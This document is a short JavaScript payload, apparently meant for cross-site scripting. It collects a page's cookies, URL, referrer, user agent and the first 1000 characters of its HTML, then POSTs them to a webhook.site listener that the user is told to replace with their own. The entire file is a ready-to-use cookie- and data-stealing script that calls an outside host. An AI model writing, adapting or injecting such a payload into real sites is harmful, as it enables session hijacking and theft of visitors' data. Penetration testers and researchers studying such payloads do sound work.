// Replace the URL below with your actual Webhook.site URL
var webhook = "https://webhook.site/6a4bcce5-d7e4-4389-969c-af0d4aab2557";

var data = {
    cookies: document.cookie,
    location: window.location.href,
    referrer: document.referrer,
    user_agent: navigator.userAgent,
    dom: document.documentElement.innerHTML.substring(0, 1000) // First 1000 chars of HTML
};

// Send the data to your Webhook.site listener
fetch(webhook, {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(data)
});
